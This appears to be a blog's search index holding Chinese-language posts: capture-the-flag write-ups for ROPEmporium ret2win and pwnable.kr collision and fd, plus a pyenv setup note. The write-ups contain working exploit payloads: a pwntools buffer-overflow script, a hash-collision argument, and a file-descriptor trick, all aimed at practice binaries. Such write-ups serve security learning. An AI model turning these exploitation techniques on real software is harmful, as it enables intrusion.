<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ROPEmporium ret2win</title>
      <link href="/2020/04/13/ret2win/"/>
      <url>/2020/04/13/ret2win/</url>
      
        <content type="html"><![CDATA[<h1 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h1><p>整个过程遇到了许多的坑，系统是ubuntu 18.04.</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote><p><a href="https://ropemporium.com/challenge/ret2win.html" target="_blank" rel="noopener">https://ropemporium.com/challenge/ret2win.html</a></p></blockquote><p>checksec</p><p><img src="https://i.loli.net/2020/04/13/uW1I7QOGf5B3aq9.png" alt="image-20200413103432122"></p><p>r2</p><p><img src="https://i.loli.net/2020/04/13/Aiw4HRZID8yGfpK.png" alt="image-20200413103753525"></p><p>发现是fgets</p><p><img src="https://i.loli.net/2020/04/13/jOLK3wlnsfJcbTI.png" alt="image-20200413103911513"></p><p>可以看出来要ret到这个函数里面</p><p>gdb</p><p><img src="https://i.loli.net/2020/04/13/VKAMJZ8t3bWFLsx.png" alt="image-20200413104216804"></p><p><img src="https://i.loli.net/2020/04/13/Utjrz4REmhTYqla.png" alt="image-20200413104400096"></p><p>padding应该有40位。</p><p>构造相应的payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">'./ret2win'</span>)</span><br><span class="line">info(<span class="string">'%#x target'</span>, elf.symbols.ret2win)</span><br><span class="line"></span><br><span class="line">io = process(elf.path)</span><br><span class="line"><span class="comment"># ret2win = p64(elf.symbols.ret2win)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">40</span> + p64(<span class="number">0x400824</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">flag=io.recvall()</span><br><span class="line">success(flag)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/13/GEvNs2xaceT8nQl.png" alt="image-20200413104630237"></p><h2 id="一个坑"><a href="#一个坑" class="headerlink" title="一个坑"></a>一个坑</h2><p>ubuntu18.04下 覆盖的ret地址不能是ret2win的函数开始地址，应该是对应的system地址。</p><p>原因好像是18.04在内存对齐上有特殊的要求，等研究好了这里会补充</p><blockquote><p>[<a href="https://ropemporium.com/guide.html#Common%20pitfalls]" target="_blank" rel="noopener">https://ropemporium.com/guide.html#Common%20pitfalls]</a>(<a href="https://ropemporium.com/guide.html#Common" target="_blank" rel="noopener">https://ropemporium.com/guide.html#Common</a> pitfalls)</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ROPEmporium </tag>
            
            <tag> ret2win </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnalbe.kr C2.collision WP</title>
      <link href="/2020/04/09/Pwnable%202/"/>
      <url>/2020/04/09/Pwnable%202/</url>
      
        <content type="html"><![CDATA[<h1 id="Pwnalbe-kr-C2-collision-WP"><a href="#Pwnalbe-kr-C2-collision-WP" class="headerlink" title="Pwnalbe.kr C2.collision WP"></a>Pwnalbe.kr C2.collision WP</h1><a id="more"></a><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码如上</p><p>核心思路就是要一个五个字符的passcode。Sum[passcode] = 0x21DD09EC</p><p>那么就直接构造4个小的最后再用合减去就有了第五个字符。</p><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./col `python -c <span class="string">"print('\x01\x01\x01\x01'*4+'\xe8\x05\xd9\x1d')"</span>`</span></span><br></pre></td></tr></table></figure><p>​    </p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwnable.kr </tag>
            
            <tag> fd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnalbe.kr C1.fd WP</title>
      <link href="/2020/04/09/Pwnable%20fd/"/>
      <url>/2020/04/09/Pwnable%20fd/</url>
      
        <content type="html"><![CDATA[<h1 id="Pwnalbe-kr-C1-fd-WP"><a href="#Pwnalbe-kr-C1-fd-WP" class="headerlink" title="Pwnalbe.kr C1.fd WP"></a>Pwnalbe.kr C1.fd WP</h1><a id="more"></a><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = <span class="built_in">read</span>(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要让fd = 0 就可以把flag打印到标准输出了。</p><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./fd 4660</span></span><br><span class="line">LETMEWIN</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/09/4ZNxbSCIufmdyV9.png" alt="image-20200409172141326"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwnable.kr </tag>
            
            <tag> fd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pyenv相关安装问题</title>
      <link href="/2020/04/09/pyenv%E7%9B%B8%E5%85%B3%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98/"/>
      <url>/2020/04/09/pyenv%E7%9B%B8%E5%85%B3%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="pyenv相关安装问题"><a href="#pyenv相关安装问题" class="headerlink" title="pyenv相关安装问题"></a>pyenv相关安装问题</h1><h2 id="1-pyenv-install-下载慢"><a href="#1-pyenv-install-下载慢" class="headerlink" title="1. pyenv install 下载慢"></a>1. pyenv install 下载慢</h2><h3 id="1-代理"><a href="#1-代理" class="headerlink" title="1. 代理"></a>1. 代理</h3><p>命令行可以用<strong><em>proxychains-ng</em></strong></p><h3 id="2-pyenv-cache"><a href="#2-pyenv-cache" class="headerlink" title="2.  ~/.pyenv/cache"></a>2.  ~/.pyenv/cache</h3><p>将要安装的版本的.gz包从官网下载之后放进<code>~/.pyenv/cache</code>再pyenv install就可以安装了</p><a id="more"></a><h2 id="2-依赖"><a href="#2-依赖" class="headerlink" title="2. 依赖"></a>2. 依赖</h2><h3 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install make build-essential libssl-dev zlib1g-dev</span><br><span class="line">sudo apt-get install libbz2-dev libreadline-dev libsqlite3-dev wget curl</span><br><span class="line">sudo apt-get install llvm libncurses5-dev libncursesw5-dev</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      <categories>
          
          <category> config </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pyenv </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
